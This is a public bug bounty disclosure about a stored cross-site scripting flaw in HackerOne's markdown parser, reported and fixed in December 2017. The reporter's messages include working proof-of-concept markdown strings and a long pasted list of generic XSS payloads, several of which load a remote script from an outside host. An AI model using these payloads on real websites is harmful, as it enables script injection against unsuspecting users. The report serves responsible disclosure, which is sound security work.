---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
date: 2018-01-29
submitted: 2017-12-20T22:09:47.391Z
bounty_usd: 5000
votes: 184
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "dr_dragon"
source: "https://hackerone.com/reports/299728"
title: "Markdown parsing issue enables insertion of malicious tags and event handlers"
---
# Markdown parsing issue enables insertion of malicious tags and event handlers

> **Severity:** High | **Bounty:** 5,000 USD | **Votes:** 184 | **Program:** HackerOne | **Disclosed:** 2018-01-29

- Report: [https://hackerone.com/reports/299728](https://hackerone.com/reports/299728)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2017-12-20T22:09:47.391Z

## Timeline

- **2017-12-20** @dr_dragon: #proof of concept :
</http:<marquee>Hello Hackerone
- **2017-12-21** @dr_dragon: # Another Poc:
</xss://<\div\ style=\"font-size:24px;background:red;color:red;width:50%;height:48px;line-height:48px;text-align:center;x:expression(alert(1));/\"\>>Hackerone
- **Report Filed**
- **Report Triaged**
- **2017-12-21** @dr_dragon: Thanks sir !

Ican also use script tag.

This input might look like this: 
```
</http://<?php\><\h1\><script:script>confirm(2)
```
Let me know if there's anything I can help out with
- **2017-12-21** @wvdv: @ahmed_anwer_mohamed I also tried to include a script but was blocked by our CSP policy. Did you succeed showing the alert box? 

Out of curiosity, how did you find this issue?
- **2017-12-21** @dr_dragon: I could insert a <script> tag or an element with an event handler, but it wouldn't run because these unsafe inline scripts were blocked by your CSP.
- **2017-12-21** @dr_dragon: I spent a alot of hours trying to add markdown inputs like this way :)

```
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
</xss:xss><svg/onload=alert(1)>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
veris-->group<svg/onload=alert(/XSS/)//
#"><img src=M onerror=alert('XSS');>
element[attribute='<img src=x onerror=alert('XSS');>
[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]
%22;alert%28%27RVRSH3LL_XSS%29//
javascript:alert%281%29;
<w contenteditable id=x onfocus=alert()>
```

but nothing happened,then suddenly i noticed this one ```</xss:xss>``` , at one point found an actual bug and while trying to build that bug into a vulnerability, I stumbled on the fact that:
```
</http://<\marquee\><a>hello
``` 
was being rendered as
```
<marquee><a>hello</a></marquee>
```
and quickly realized that I could use this bug to insert arbitrary HTML into a bug report :)
- **Report Severity Updated**
- **2017-12-21** @wvdv: A fix is deployed! We have to spend some time figuring out the RCA; I'll keep you posted. 

For those who missed the HackerOne report redesign, here's a screenshot:
{F248579}
- **2017-12-21** @dr_dragon: Nice work , It seems to be fixed now :)
- **Report Severity Updated**
- **Report Resolved**
- **2017-12-21** @dr_dragon: Hey jobert ! ,
Thanks for the quick response :)
- **Bounty Awarded**
- **2017-12-21** @dr_dragon: Thanks for the bounty, the nice words, and running a great service! :)
- **2017-12-23** @dr_dragon: Thanks for fixing this , it's a great honor to be listed on Hackerone hall of frame :)
- **Agreed On Going Public**
- **2018-01-04** @dr_dragon: Not yet :) .
- **2018-01-28** @jobert: Hi @ahmed_anwer_mohamed - heads up: this report is scheduled to go public in the next week.
- **2018-01-28** @dr_dragon: Sorry sir @jobert
But I do not want to publish now .
- **2018-01-29** @wvdv: Hey @ahmed_anwer_mohamed,

As per policy, we disclose reports within 30 days after they are resolved. What are your objections to publishing this? Is there anything we can help you with?

We think this is a pretty cool bug; it shows that our markdown parsing process still has surprising features. Let's show the world this issue and that even HackerOne has XSS vulnerabilities ;)

Thanks,

Willian
- **Agreed On Going Public**
- **Report Became Public**
